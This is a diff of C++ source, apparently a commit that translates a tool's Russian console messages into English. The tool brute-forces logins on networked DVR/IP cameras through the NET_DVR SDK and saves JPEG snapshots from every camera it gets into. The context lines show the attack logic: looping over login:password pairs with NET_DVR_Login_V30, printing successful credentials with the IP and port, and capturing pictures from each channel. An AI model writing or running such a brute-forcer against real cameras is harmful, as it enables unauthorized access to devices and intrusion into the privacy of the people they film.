@@ -28,7 +28,7 @@ void loadPhotos(const std::string ip, const long user_id, const NET_DVR_DEVICEIN
 int main() {
     mkdir("./pictures", 0655);
     if (!NET_DVR_Init()) {
-        std::cout << "Ошибка NET_DVR_Init\n";
+        std::cout << "Error NET_DVR_Init\n";
         return 0;
     }
     NET_DVR_SetConnectTime();
@@ -48,7 +48,7 @@ int main() {
 
     NET_DVR_Cleanup();
 
-    std::cout << "Нажмите enter, чтобы продолжить ...\n";
+    std::cout << "Press enter to continue ...\n";
     std::cin.get();
     return 0;
 }
@@ -71,7 +71,7 @@ void bruteforce() {
 
 void brute(std::string ip) {
     if (!validateIpAddress(ip)) {
-        std::cout << ip << " это не ip адресс" << std::endl;
+        std::cout << ip << " not ip address" << std::endl;
         return;
     }
 
@@ -93,7 +93,7 @@ void brute(std::string ip) {
         UserID = NET_DVR_Login_V30((char *) host, (const WORD) port, (char *) login, (char *) password,
                                    &device_info);
 
-        std::cout << "Использую данные " << login << ":" << password << " для " << ip << std::endl;
+        std::cout << "Trying " << login << ":" << password << " for " << ip << std::endl;
         if (UserID != -1) {
             std::cout << "\t\t\t\t\t\t\t\t" << login << ":" << password << "@" << ip << ":" << port
                       << std::endl;
@@ -105,7 +105,7 @@ void brute(std::string ip) {
             NET_DVR_Logout(UserID);
             return;
         } else {
-            std::cout << "Не удалось войти" << std::endl;
+            std::cout << "Could not sign in." << std::endl;
         }
     }
 }
@@ -119,7 +119,8 @@ void loadPhotos(const std::string ip, const long user_id, const NET_DVR_DEVICEIN
         params.wPicSize = 0;
         if (NET_DVR_CaptureJPEGPicture((LONG) user_id, channel, &params, (char *) filename.c_str())) {
             chmod(filename.c_str(), 0655);
-            std::cout << "\t\t\t\t\t\t\t\tПолучение фото с камеры " << ip << ":" << port << "..." << std::endl;
+            std::cout << "\t\t\t\t\t\t\t\tGetting a photo (channel " << channel << ") from the camera " << ip << ":" << port << "..."
+                      << std::endl;
         }
     }
 }
